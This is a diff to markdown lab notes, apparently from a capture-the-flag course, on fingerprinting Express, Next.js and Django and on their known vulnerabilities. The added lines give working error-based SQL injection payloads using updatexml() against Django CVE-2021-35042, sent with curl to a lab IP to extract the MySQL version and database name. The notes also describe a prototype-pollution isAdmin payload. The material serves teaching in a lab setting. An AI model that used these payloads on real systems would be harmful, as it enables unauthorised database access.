@@ -40,8 +40,8 @@
     ```
     curl -b cookies.txt -X POST http://MACHINE_IP:3000/api/user/update -H "Content-Type: application/json" -d '{"name": "Alice", "email":"alice@example.com"}'
     ```
-    - Every JavaScript object inherits from a shared root called *** Object.prototype ***
-    - When merge function receives *** {"proto": {"isAdmin": true}} *** without filtering the proto key, it writes isAdmin: true directly onto Object.prototype, not onto any individual user object
+    - Every JavaScript object inherits from a shared root called **Object.prototype**
+    - When merge function receives **{"proto": {"isAdmin": true}}** without filtering the proto key, it writes **isAdmin: true** directly onto **Object.prototype**, not onto any individual user object
 
 
 
@@ -58,7 +58,7 @@
     curl -I http://machine_ip:3001/
     ```
 
-    - *** window.__next_f *** in script tag confirms App Router
+    - **window.__next_f** in script tag confirms **App Router**
     
 ## CVE-2025-29927: Middleware Bypass
 - In Next.js, middleware is a function that runs before every request reaches a page
@@ -77,11 +77,11 @@
 
 
 # Django
-- *** CVE-2021-35042 *** is SQL injection vulnerability in Django's order_by() query method, rated CVSS 9.8 Critical and requiring no authentication to exploit
+- **CVE-2021-35042** is SQL injection vulnerability in Django's **order_by()** query method, rated CVSS **9.8 Critical** and requiring no authentication to exploit
 
 ## Stack Identity
-- The Django admin panel at /admin/ and CSRF middleware are enabled by default in virtually every Django project
-- On Ubuntu, it runs typically on port 8000
+- The Django admin panel at **/admin/** and CSRF middleware are enabled by default in virtually every Django project
+- On Ubuntu, it runs typically on **port 8000**
 - Admin panel alone is a reliable stack signal before you send a single exploit payload
  
 ## Fingerprinting Django
@@ -89,7 +89,7 @@
     ```
     curl -I "http://machine_ip:8000/products/"
     ```
-    - *** csrfmiddlewaretoken *** hidden field is the most reliable Django fingerprint
+    - **csrfmiddlewaretoken** hidden field is the most reliable Django fingerprint
 
 - The App: Products Catalogue
     - App running on port 8000 is simple product catalogue
@@ -98,8 +98,8 @@
         curl -s "http://machine_ip:8000/products/"
         ```
 
-        - Here, Having *** csrfmiddlewaretoken *** confirm Django
-        - *** order *** parameter in form, is our injection point
+        - Here, Having **csrfmiddlewaretoken** confirm Django
+        - **order** parameter in form, is our injection point
 
 ## CVE-2021-35042: The Vulnerability
 ```
@@ -110,3 +110,19 @@ sql = (
 )
 ```
 - The CASE WHEN structure is always true(1=1), so the THEN branch always executes, making it the injection entry point
+
+- The **updatexml()** technique exploits how MySQL handles XPath errors
+- **updatexml(1, xpath_expr, 1)** raises an error if XPath expression is invalid
+- The **updatexml()** technique only works when **DEBUG=True** is set in **settings.py**
+- For **DEBUG=False** returns generic 500 page with no errors details
+- If debug output is suppressed, blind time-based injection using **SLEEP()** is the fallback
+
+## Exploitation Walkthrough
+1. Extract MySQL Version
+    ```
+    curl -s "http://10.48.142.230:8000/products/?order=updatexml(1,concat(0x7e,(select%20@@version)),1)" | grep -o '~[0-9][^&]*'
+    ```
+2. Extract the Database Name
+    ```
+    curl -s "http://10.48.142.230:8000/products/?order=updatexml(1,concat(0x7e,(select%20database())),1)" | grep -o '~[0-9a-zA-Z_][^&]*'
+    ```
